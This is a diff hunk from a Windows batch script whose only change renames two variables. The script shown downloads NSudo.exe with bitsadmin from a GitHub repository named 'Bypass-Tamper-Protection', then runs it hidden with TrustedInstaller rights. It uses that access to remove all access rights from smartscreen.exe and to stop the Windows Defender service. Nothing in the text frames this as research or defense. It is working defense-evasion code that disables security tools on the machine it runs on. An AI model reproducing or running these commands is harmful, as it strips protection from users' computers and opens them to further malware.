@@ -71,12 +71,12 @@ cd  %temp%
 
 bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
 
-set i=%systemroot%
+set iop=%systemroot%
 
-set y=System32
+set yop=System32
 
 
-NSudo.exe -U:T -ShowWindowMode:Hide icacls "%i%\%y%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+NSudo.exe -U:T -ShowWindowMode:Hide icacls "%iop%\%yop%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
